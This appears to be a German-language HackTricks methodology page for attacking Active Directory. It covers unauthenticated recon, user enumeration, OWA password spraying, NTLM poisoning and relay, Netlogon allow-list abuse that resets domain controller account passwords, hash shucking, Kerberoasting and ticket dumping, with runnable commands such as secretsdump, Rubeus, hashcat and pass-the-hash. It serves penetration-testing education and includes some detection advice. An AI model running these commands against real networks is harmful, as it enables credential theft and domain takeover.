# Active Directory Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** dient als grundlegende Technologie und ermöglicht es **Netzwerkadministratoren**, **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist auf Skalierbarkeit ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen**, während **Zugriffsrechte** auf verschiedenen Ebenen kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **Domänen**, **Trees** und **Forests**. Eine **Domäne** umfasst eine Sammlung von Objekten, wie **Benutzern** oder **Geräten**, die eine gemeinsame Datenbank verwenden. **Trees** sind Gruppen dieser Domänen, die durch eine gemeinsame Struktur verbunden sind, und ein **Forest** stellt die Sammlung mehrerer Trees dar, die durch **Trust Relationships** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können bestimmte **Zugriffs**- und **Kommunikationsrechte** festgelegt werden.

Zu den wichtigsten Konzepten innerhalb von **Active Directory** gehören:

1. **Directory** – Enthält alle Informationen zu Active-Directory-Objekten.
2. **Object** – Bezeichnet Entitäten innerhalb des Directorys, einschließlich **Benutzern**, **Gruppen** oder **freigegebenen Ordnern**.
3. **Domain** – Dient als Container für Directory-Objekte. Innerhalb eines **Forests** können mehrere Domänen existieren, wobei jede ihre eigene Objektsammlung verwaltet.
4. **Tree** – Eine Gruppierung von Domänen, die eine gemeinsame Root-Domäne verwenden.
5. **Forest** – Die höchste Ebene der Organisationsstruktur in Active Directory, bestehend aus mehreren Trees mit **Trust Relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfassen eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Zu diesen Diensten gehören:

1. **Domain Services** – Zentralisieren die Datenspeicherung und verwalten die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich **Authentifizierung** und **Suche**.
2. **Certificate Services** – Überwachen die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützen verzeichnisfähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bieten **Single-Sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen hinweg innerhalb einer einzigen Sitzung zu authentifizieren.
5. **Rights Management** – Unterstützt den Schutz urheberrechtlich geschützten Materials, indem unbefugte Verteilung und Nutzung reguliert werden.
6. **DNS Service** – Ist entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein **AD angreift**, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie es funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine umfangreiche Übersicht der Befehle, die du zur Aufzählung und zum **Exploiten** eines AD ausführen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert einen vollständig qualifizierten Namen (FQDN)** zur Ausführung von Aktionen. Wenn du versuchst, über die IP-Adresse auf eine Maschine zuzugreifen, **wird NTLM und nicht Kerberos verwendet**.

## Recon Active Directory (Keine Credentials/Sessions)

Wenn du lediglich Zugriff auf eine AD-Umgebung hast, aber über keine Credentials/Sessions verfügst, könntest du Folgendes tun:

- **Das Netzwerk pentesten:**
- Das Netzwerk scannen, Maschinen und offene Ports finden und versuchen, **Schwachstellen zu exploiten** oder **Credentials zu extrahieren** (beispielsweise [Drucker könnten sehr interessante Ziele sein](ad-information-in-printers.md).
- Die Aufzählung von DNS kann Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Shares, VPN, Medien usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Wirf einen Blick auf die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), um weitere Informationen darüber zu erhalten.
- **Auf Null- und Guest-Zugriff auf SMB-Diensten prüfen** (dies funktioniert bei modernen Windows-Versionen nicht):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine ausführlichere Anleitung zur Aufzählung eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine ausführlichere Anleitung zur Aufzählung von LDAP findest du hier (achte **besonders auf den anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
- Credentials sammeln durch [**das Impersonieren von Services mit Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Auf einen Host zugreifen durch [**den Missbrauch des Relay-Angriffs**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Credentials sammeln durch das **Offenlegen** [**gefälschter UPnP-Services mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Benutzernamen und Namen aus internen Dokumenten, sozialen Medien und Services (hauptsächlich dem Web) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen extrahieren.
- Wenn du die vollständigen Namen von Mitarbeitern eines Unternehmens findest, kannst du verschiedene AD-**Benutzernamekonventionen (**[**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (je 3 Buchstaben), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Siehe die Seiten zu [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefordert wird**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. Dadurch können wir feststellen, dass der Benutzername ungültig war. **Gültige Benutzernamen** lösen entweder eine Antwort mit dem **TGT in einer AS-REP** oder den Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ aus, der anzeigt, dass der Benutzer eine Pre-Authentication durchführen muss.
- **Keine Authentifizierung gegenüber MS-NRPC**: Verwendung von auth-level = 1 (keine Authentifizierung) gegenüber der MS-NRPC-(Netlogon-)Schnittstelle auf Domain Controllern. Die Methode ruft nach dem Binden an die MS-NRPC-Schnittstelle die Funktion `DsrGetDcNameEx2` auf, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Aufzählung. Die Untersuchung ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> zu finden.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access)-Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch eine **Benutzeraufzählung gegen ihn** durchführen. Beispielsweise könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listen von Benutzernamen findest du in [**diesem github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Du solltest jedoch die **Namen der Personen, die im Unternehmen arbeiten**, aus dem Recon-Schritt haben, den du vor diesem Schritt durchgeführt haben solltest. Mit Vor- und Nachnamen kannst du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Missbrauch der Allow-List für verwundbare Netlogon-Kanäle (Onelogon)

Auch wenn **Zerologon** auf dem DC gepatcht ist, können explizit allow-gelistete Konten weiterhin durch **legacy/vulnerable Netlogon secure-channel behavior** gefährdet sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL security descriptor** (siehe [Security Descriptors](security-descriptors.md)). Jedes Konto oder jede Gruppe, der die entsprechende ACE in der DACL gewährt wurde, kann als Ziel verwendet werden. Beispielsweise setzt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** auf die Allow-List.

Praktischer Operator-Workflow:

1. **Identifiziere allow-gelistete Principals**, indem du sowohl **SYSVOL/GPO** als auch die **live DC registry** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs** zu realen AD-Benutzern/Computern auf und priorisiere **DC machine accounts**, **trust accounts** und andere privilegierte Maschinen.
3. Versuche wiederholt die **MS-NRPC / Netlogon authentication** als das allow-gelistete Konto.
4. Nach einem erfolgreichen Guess missbrauche **Netlogon password-setting**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf einen leeren String).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Hinweise:

- Der **scanner** ist nützlich, weil die effektive Allow-Liste in **SYSVOL**, in der **registry** oder in beiden vorhanden sein kann.
- Der **exploit path** selbst ist wichtig, weil er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain Controller machine account** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt weiterführende **AD takeover**-Pfade ermöglichen kann.
- Die **Brute-force-Machbarkeit** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, einen **24-Bit**-Brute-Force-Angriff, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zu Detection / Hardening:

- Prüfe die Allow-Listen-Policy und entferne alles außer vorübergehenden, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache die DC-**System**-Events **5827/5828/5829/5830/5831**, um verwundbare Netlogon-Verbindungen zu erkennen, die abgelehnt, entdeckt oder durch die Policy ausdrücklich erlaubt wurden.
- Behandle Konten in `VulnerableChannelAllowList` als **hohes Risiko**, bis die Legacy-Abhängigkeit entfernt wurde.

### Einen oder mehrere Benutzernamen kennen

Wenn du also weißt, dass du bereits einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht über** das Attribut _DONT_REQ_PREAUTH_ verfügt, kannst du eine **AS_REP message** für diesen Benutzer **anfordern**, die einige Daten enthält, die durch eine Ableitung des Passworts des Benutzers verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuchen wir die **häufigsten Passwörter** mit jedem der gefundenen Benutzer. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachte dabei die Passwort-Policy!).
- Beachte, dass du auch **OWA servers sprühen** kannst, um Zugriff auf die Mailserver der Benutzer zu erlangen.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Du könntest einige Challenge-**Hashes** erhalten, indem du bestimmte **network protocols** durch **Poisoning** vergiftest:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn du das Active Directory erfolgreich enumerieren konntest, verfügst du über **mehr E-Mail-Adressen und ein besseres Verständnis des Netzwerks**. Du könntest NTLM- [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD-Umgebung zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Verwende **`nxcdb` workspaces**, um den AD-Recon-Status pro Engagement zu speichern: `workspace create <name>` erzeugt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap usw.). Wechsle die Ansichten mit `proto smb|mssql|winrm` und liste gesammelte Secrets mit `creds` auf. Lösche vertrauliche Daten nach Abschluss manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** zeigt **domain**, **OS build**, **SMB signing requirements** und **Null Auth** an. Members mit `(signing:False)` sind **relay-prone**, während DCs häufig signing erfordern.
- Erzeuge **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay zum DC durch Signing blockiert** wird, sollte trotzdem die **LDAP**-Sicherheitslage geprüft werden: `netexec ldap <dc>` hebt `(signing:None)` / schwaches Channel Binding hervor. Ein DC mit erforderlichem SMB Signing, aber deaktiviertem LDAP Signing bleibt ein geeignetes **relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Client-seitige Drucker-Credential-Leaks → umfassende Validierung von Domain-Credentials

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Das Anzeigen des Quelltexts bzw. die Verwendung der DevTools kann den Klartext offenlegen (z. B. `<input value="<password>">`) und so den Zugriff per Basic-auth auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerbezogenen Passwörtern enthalten. Beim Testen sollten die Zuordnungen beibehalten werden:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Wenn du mit dem **null oder guest user auf andere PCs oder shares zugreifen** kannst, könntest du **Dateien platzieren** (wie eine SCF-Datei), die bei einem Zugriff **eine NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Passwortkandidaten für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder cached credentials per Brute-Force zu testen, übergibst du die NT-Hashes an Hashcats NT-candidate modes und lässt die Wiederverwendung von Passwörtern validieren, ohne jemals den Klartext zu erfahren. Dies ist besonders wirkungsvoll nach einem Domain-Kompromittieren, wenn du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Verwende shucking, wenn:

- Du über ein NT corpus aus DCSync-, SAM/SECURITY-dumps oder credential vaults verfügst und die Wiederverwendung in anderen Domains/Forests testen musst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses oder DCC/DCC2 blobs erfasst.
- Du die Wiederverwendung langer, nicht crackbarer Passphrasen schnell nachweisen und unmittelbar per Pass-the-Hash pivotieren möchtest.

Die Technik **funktioniert nicht** gegen encryption types, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos etype 17/18 AES). Wenn eine Domain ausschließlich AES erzwingt, musst du zu den regulären password modes zurückkehren.

#### Erstellen eines NT hash corpus

- **DCSync/NTDS** – Verwende `secretsdump.py` mit history, um die größtmögliche Menge an NT-Hashes (und deren vorherige Werte) zu erhalten:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Weitere Möglichkeiten zum Sammeln von NTDS secrets findest du unter:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und cached domain logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben `nt_candidates.txt`-Liste hinzu.
- **Metadaten erfassen** – Bewahre den Benutzernamen/die Domain auf, aus denen jeder Hash stammt (auch wenn die wordlist nur Hex-Werte enthält). Übereinstimmende Hashes zeigen dir sofort, welcher principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem trusted Forest; dadurch maximierst du die Wahrscheinlichkeit einer Überschneidung beim shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-candidate inputs **müssen rohe NT-Hashes mit 32 Hex-Zeichen bleiben**. Deaktiviere rule engines (kein `-r`, keine hybrid modes), da das Mangling das candidate key material beschädigt.
- Diese modes sind nicht grundsätzlich schneller, aber der NTLM keyspace (~30.000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist deutlich günstiger, als den gesamten password space im langsamen Format zu durchsuchen.
- Führe immer den **aktuellsten Hashcat build** aus (`git clone https://github.com/hashcat/hashcat && make install`), da die modes 31500/31600/35300/35400 erst kürzlich veröffentlicht wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT mode für AS-REQ Pre-Auth, und AES etypes (19600/19700) benötigen das Klartextpasswort, da ihre Schlüssel über PBKDF2 aus UTF-16LE-Passwörtern und nicht aus rohen NT-Hashes abgeleitet werden.

#### Beispiel – Kerberoast RC4 (mode 35300)

1. Erfasse ein RC4 TGS für einen Ziel-SPN mit einem low-privileged user (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Führe shucking des Tickets mit deiner NT-Liste durch:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet aus jedem NT-Kandidaten den RC4-Schlüssel ab und validiert den `$krb5tgs$23$...`-Blob. Ein Treffer bestätigt, dass der Service Account einen deiner vorhandenen NT-Hashes verwendet.

3. Pivotiere sofort per PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls erforderlich.

#### Beispiel – Cached credentials (mode 31600)

1. Dump die cached logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile des interessanten Domain-Benutzers nach `dcc2_highpriv.txt` und führe shucking durch:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ein erfolgreicher Treffer liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der cached user ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe einen Brute-Force-Angriff im schnellen NTLM mode durch, um den String wiederherzustellen.

Derselbe Workflow gilt für NetNTLM challenge-responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer identifiziert wurde, kannst du relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit masks/rules erneut cracken.



## Active Directory MIT credentials/session enumerieren

Für diese Phase musst du **die Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert haben.** Wenn du über gültige Credentials oder eine Shell als Domain-User verfügst, **solltest du daran denken, dass die zuvor genannten Optionen weiterhin Möglichkeiten zur Kompromittierung anderer User darstellen**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du wissen, was das **Kerberos double hop problem** ist.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die Kompromittierung eines Accounts ist ein **großer Schritt, um mit der Kompromittierung der gesamten Domain zu beginnen**, da du nun die **Active Directory Enumeration starten kannst:**

Im Hinblick auf [**ASREPRoast**](asreproast.md) kannst du jetzt jeden potenziell verwundbaren User finden. Mit [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Usernames** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter sowie neue vielversprechende Passwörter testen.

- Du könntest die [**CMD für eine grundlegende Recon verwenden**](../basic-cmd-for-pentesters.md#domain-info)
- Du kannst auch [**powershell für Recon verwenden**](../basic-powershell-for-pentesters/index.html), was stealthier ist
- Du kannst auch [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres hervorragendes Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (abhängig von den verwendeten collection methods), aber **wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo User RDP verwenden können, finde Pfade zu anderen Gruppen usw.
- **Weitere automatisierte AD-enumeration tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** durchsuchen, um nach Credentials in den Feldern _userPassword_ und _unixUserPassword_ oder sogar nach _Description_ zu suchen. Siehe [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools ausprobieren:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-User extrahieren**

Es ist sehr einfach, alle Domain-Usernames aus Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt kurz wirkt, ist er der wichtigste Teil überhaupt. Öffne die Links (vor allem die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder festzustellen, dass nichts getan werden kann.

### Kerberoast

Kerberoasting umfasst das Erlangen von **TGS tickets**, die von an User-Accounts gebundenen Services verwendet werden, und das **offline** Cracken ihrer Verschlüsselung, die auf User-Passwörtern basiert.

Mehr dazu:

 
{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sobald du einige Credentials erhalten hast, könntest du prüfen, ob du Zugriff auf eine **Machine** hast. Dafür könntest du **CrackMapExec** verwenden, um anhand deiner Port-Scans mit unterschiedlichen Protokollen Verbindungen zu mehreren Servern herzustellen.

### Local Privilege Escalation

Wenn du Credentials oder eine Session als regulärer Domain-User kompromittiert hast und mit diesem User **Zugriff** auf **eine beliebige Machine in der Domain** besitzt, solltest du versuchen, lokal **deine Privilegien zu eskalieren und nach Credentials zu suchen**. Denn nur mit lokalen Administratorrechten kannst du **Hashes anderer User** im Speicher (LSASS) und lokal (SAM) **dumpen**.

In diesem Buch gibt es eine vollständige Seite über [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**checklist**](../checklist-windows-privilege-escalation.md). Vergiss außerdem nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Current Session Tickets

Es ist sehr **unwahrscheinlich**, dass du im aktuellen User **tickets** findest, die dir **Zugriff auf** unerwartete Ressourcen gewähren. Du kannst jedoch Folgendes prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, das Active Directory zu enumerieren, wirst du **mehr E-Mail-Adressen und ein besseres Verständnis des Netzwerks** haben. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** erzwingen.**

### Nach Creds in Computer-Shares | SMB-Shares suchen

Da du nun einige grundlegende Zugangsdaten hast, solltest du prüfen, ob du **interessante Dateien finden** kannst, die **innerhalb des AD geteilt werden**. Du könntest das manuell tun, aber es ist eine sehr langweilige, sich wiederholende Aufgabe (insbesondere, wenn du Hunderte von Dokumenten findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über Tools zu erfahren, die du verwenden könntest.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du **auf andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die bei einem entsprechenden Zugriff eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und knacken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation im Active Directory MIT privilegierten Zugangsdaten/einer privilegierten Session

**Für die folgenden Techniken reicht ein regulärer Domain-Benutzer nicht aus; du benötigst spezielle Berechtigungen/Zugangsdaten, um diese Angriffe durchzuführen.**

### Hash extraction

